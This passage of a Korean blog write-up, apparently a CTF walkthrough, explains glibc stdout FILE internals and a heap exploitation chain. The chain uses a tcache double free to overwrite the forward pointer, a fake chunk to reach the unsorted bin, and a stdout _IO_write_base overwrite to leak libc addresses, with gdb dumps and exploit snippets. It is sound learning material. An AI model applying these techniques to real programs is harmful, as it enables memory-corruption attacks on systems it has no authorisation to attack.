operator\">:</span>   <span class=\"token number\">0x000000000a000000</span>      <span class=\"token number\">0x00007ffff7dd18c0</span>\n<span class=\"token number\">0x7ffff7dd07f0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">144</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0xffffffffffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0800</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">160</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00007ffff7dcf8c0</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0810</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">176</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0820</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">192</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00000000ffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0830</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">208</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcc2a0</span></code></pre></div>\n<ul>\n<li>printf, puts와 같은 stdout 파일 디스크립터를 사용하는 함수가 호출될 때 내부적으로 <code class=\"language-text\">_IO_new_do_write</code> 함수가 호출된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoklEQVQI1x3GSQ6CMAAAQB4ji5RuQEvpRhcKxeBBTUxM/P87TJzTFFa7PZ8m7sJ4EzYTNrWsNmaXDht37ZK0YbbBpUP7pFzUPpmwzzaggRfLdnt9vufzbWNWLnFlJ+2ECZPxk/aUSUDGFg94FITNsOddz/EoABkBZYVcYj4f63Fn0rR4qDtSAdxAekV92aIa4KrDDSRliy5XVEP6D2wgrQD+AX+TKAXqDJjcAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png\"\n        srcset=\"/static/ddb40862e7ea005b1c65709846244bc6/e9ff0/3.png 180w,\n/static/ddb40862e7ea005b1c65709846244bc6/f21e7/3.png 360w,\n/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png 720w,\n/static/ddb40862e7ea005b1c65709846244bc6/302a4/3.png 1080w,\n/static/ddb40862e7ea005b1c65709846244bc6/0f246/3.png 1118w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">puts</code> 함수를 호출할 때 <code class=\"language-text\">_IO_new_file_xsputn</code> 함수를 호출하고 해당 함수에서 다음과 같이 <code class=\"language-text\">new_do_write</code> 함수를 호출하게 된다.</li>\n</ul>\n<h2 id=\"_io_new_file_xsputn-함수\" style=\"position:relative;\"><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\" aria-label=\"_io_new_file_xsputn 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_new_file_xsputn 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">_IO_size_t\n<span class=\"token function\">_IO_new_file_xsputn</span> <span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span>f<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> _IO_size_t n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>do_write<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\tcount <span class=\"token operator\">=</span> <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> do_write<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\tto_do <span class=\"token operator\">-=</span> count<span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>count <span class=\"token operator\">&lt;</span> do_write<span class=\"token punctuation\">)</span>\n\t\t    <span class=\"token keyword\">return</span> n <span class=\"token operator\">-</span> to_do<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>new_do_write(f,s,do_write) 함수 호출</li>\n<li>fp, stdout 구조체</li>\n</ul>\n<h2 id=\"new_do_write-함수\" style=\"position:relative;\"><a href=\"#new_do_write-%ED%95%A8%EC%88%98\" aria-label=\"new_do_write 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>new_do_write 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_IO_IS_APPENDING</span> <span class=\"token expression\"><span class=\"token number\">0x1000</span></span></span>\n\n<span class=\"token keyword\">static</span> size_t <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> size_t to_do<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  size_t count<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _flags 멤버 변수의 값이</span>\n\t<span class=\"token comment\">//  _IO_IS_APPENDING 비트를 포함하고 있는지 확인한다.</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> _IO_IS_APPENDING<span class=\"token punctuation\">)</span>                              \n    fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> _IO_pos_BAD<span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _IO_read_end 포인터와</span>\n\t<span class=\"token comment\">// _IO_write_base 포인터가 다른지 확인한다.</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_IO_read_end <span class=\"token operator\">!=</span> fp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">)</span>                  \n    <span class=\"token punctuation\">{</span>\n      off64_t new_pos\n\t<span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSSEEK</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">-</span> fp<span class=\"token operator\">-></span>_IO_read_end<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>new_pos <span class=\"token operator\">==</span> _IO_pos_BAD<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> new_pos<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 만약 line 8의 조건에서 값이 같다면</span>\n<span class=\"token comment\">//  _IO_SYSWRITE 함수를 통해 new_do_write 함수의 인자인 data를 to_do의 크기만큼 출력한다.</span>\n  count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \n                      \n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">&amp;&amp;</span> count<span class=\"token punctuation\">)</span>\n    fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">=</span> <span class=\"token function\">_IO_adjust_column</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">_IO_setg</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_write_ptr <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_end <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_mode <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span>\n\t\t       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>_IO_LINE_BUF <span class=\"token operator\">|</span> _IO_UNBUFFERED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t       <span class=\"token operator\">?</span> fp<span class=\"token operator\">-></span>_IO_buf_base <span class=\"token operator\">:</span> fp<span class=\"token operator\">-></span>_IO_buf_end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> count<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>stdout→flags 에 <code class=\"language-text\">_IO_IS_APPENDING</code> 이 포함되어 있어야 한다.</li>\n<li>_IO_new_do_write, _IO_SYSWRITE를 통해 _IO_write_base를 출력한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">--</span><span class=\"token operator\">></span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">_IO_sputn</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> hp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">,</span> to_flush<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> to_flush<span class=\"token punctuation\">)</span>\n\tresult <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"how-to-exploit-using-stdout\" style=\"position:relative;\"><a href=\"#how-to-exploit-using-stdout\" aria-label=\"how to exploit using stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to exploit using stdout</h2>\n<ul>\n<li>flags, _IO_write_base를 조작 한다.</li>\n<li>_IO_write_base를 하위 바이트만 조작하여 라이브러리 줏소가 위치한 주소를 가리키게 하여 라이브러리 주소를 출력할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token constant\">stdout</span>\n$<span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  _flags <span class=\"token operator\">=</span> <span class=\"token number\">0xfbad2887</span><span class=\"token punctuation\">,</span> \n  _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e4</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token operator\">></span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> \n  _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcfa00</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdin_<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span> \n  _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _old_offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd18c0</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_1_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcf8c0</span> <span class=\"token operator\">&lt;</span>_IO_wide_data_1<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _mode <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">,</span> \n  _unused2 <span class=\"token operator\">=</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>해당 구조체를 덮어쓰기 위해서는 라이브러리 주소를 이용해야 한다.</li>\n<li>main_arena 영역 주소가 힙 청크에 남아야 하며 그렇게 하기 위해서는 unsorted bin을 이용해야 한다.</li>\n</ul>\n<h2 id=\"double-free-bug\" style=\"position:relative;\"><a href=\"#double-free-bug\" aria-label=\"double free bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Double Free Bug</h2>\n<ul>\n<li>Double Free Bug가 발생하면 같은 포인터를 두 번 가리키며 새로 할당해 값을 쓰게 된다면 ForwarD PTR를 덮을 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free test</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB00lEQVQoz4WQ6ZKaUBCFfY2ZyAW5yL0ssu+WiIILLsjixmgQDabm/Z8glZhfU9FUnX/dX59zupUtJ/EsHgSh6bi6rQHIkgzr+p5qGgTNAogU3caSwsu67vQ936cYjoDIcFwsKi0tkk2Pt1eWPLO0viUogmZxsoFVi2MFDkDcphFBIxIiAFG7w5IMJhn8uNt6m7ptUXzv62+hCaQRYHiCRgBigsYA4sfqM7WIuUv2RDA02xObUgKK4SgGPWb/h9tTB4ji+0D7FlmkPAJdiYB8h8U0QgyHyS4GL2AgCRD1OMFQxT6rjpFui7YtmzwvYdNmuwhTEFPMX32FQ1dw1N4iHG+mUZzP9CBk9SEtD1hBM1jRxqKGBAUJGhIklv+SopVmRb49RovV5nAoq/pYNZLuGJ5fVnV5ucZJSkJEMbjzT+dltttsy9FksS4O5ff6dG00yzU9/1Q3H3WzTAsSoqed1/k+3f2GN7vj6XKrms8/8PBUN+frPcl3r769TLdJcQwm8Trfl1V9ut5VyzG8QXm5lpfbKitI5rlzUhyz/cd4ukz35fn6o7p/apZn9Yfn2/18+5kUu1ex/WgeRLHl+cEknq/TeFOIii4bzjzJ5kk+DKcvYv8CM+iZLoG+/74AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png\"\n        srcset=\"/static/086826f90fba136c03d4bc31a9fe97f5/e9ff0/4.png 180w,\n/static/086826f90fba136c03d4bc31a9fe97f5/f21e7/4.png 360w,\n/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png 720w,\n/static/086826f90fba136c03d4bc31a9fe97f5/ee455/4.png 863w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD 위치의 주소 값이 변경되어 4바이트의 0x42가 들어 가 tcache영역을 확인하게 되면 다음 주소 값이 변경된 것을 확인할 수 있겠다.</li>\n</ul>\n<h2 id=\"fake-chunk-구성\" style=\"position:relative;\"><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\" aria-label=\"fake chunk 구성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fake chunk 구성</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>unsorted bin을 구성하기 위해서는 tcache를 사용하지 않게끔 7개의 bin을 꽉 채워야 하며 <code class=\"language-text\">0x78</code> 크기 까지 할당할 수 있기 때문에 <code class=\"language-text\">0x410</code> 초과의 크기만큼 할당한후 해제하여 unsorted bin으로 만드는 것은 불가능하다.</li>\n<li>Fake Chunk를 해제해 main_arena 영역의 주소를 써야 하며 Fake Chunk를 해제하기 위해서는 인접한 청크가 존재해야 한다.</li>\n<li>0x555555757260 + 0xd0 주소에 힙 청크가 존재해야 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 469px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.11111111111111%; position: relative; bottom: 0; left: 0; background-image: 